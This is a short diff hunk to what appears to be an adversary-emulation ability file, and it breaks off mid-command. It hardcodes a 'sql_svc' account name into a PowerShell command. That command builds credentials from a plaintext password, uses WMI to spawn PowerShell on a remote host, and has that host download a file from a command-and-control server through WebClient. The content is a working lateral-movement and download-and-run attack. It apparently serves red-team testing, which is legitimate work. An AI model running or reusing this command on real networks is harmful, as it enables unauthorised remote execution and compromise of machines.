@@ -6,7 +6,7 @@
       psh:
         command: '[securestring]$password = ConvertTo-SecureString "#{host.user.password}"
           -AsPlainText -Force;          [pscredential]$credentials = New-Object System.Management.Automation.PSCredential
-          ("$env:USERDNSDOMAIN\#{host.user.name}", $password);          Invoke-WmiMethod
+          ("$env:USERDNSDOMAIN\sql_svc", $password);          Invoke-WmiMethod
           -Path win32_process -Name create -ComputerName "#{remote.host.ip}" -Credential
           $credentials -ArgumentList ''powershell.exe -C $server=\"#{server}\"; $url=\"$server/file/download\";
           $wc=New-Object System.Net.WebClient; $wc.Headers.add(\"platform\",\"windows\");
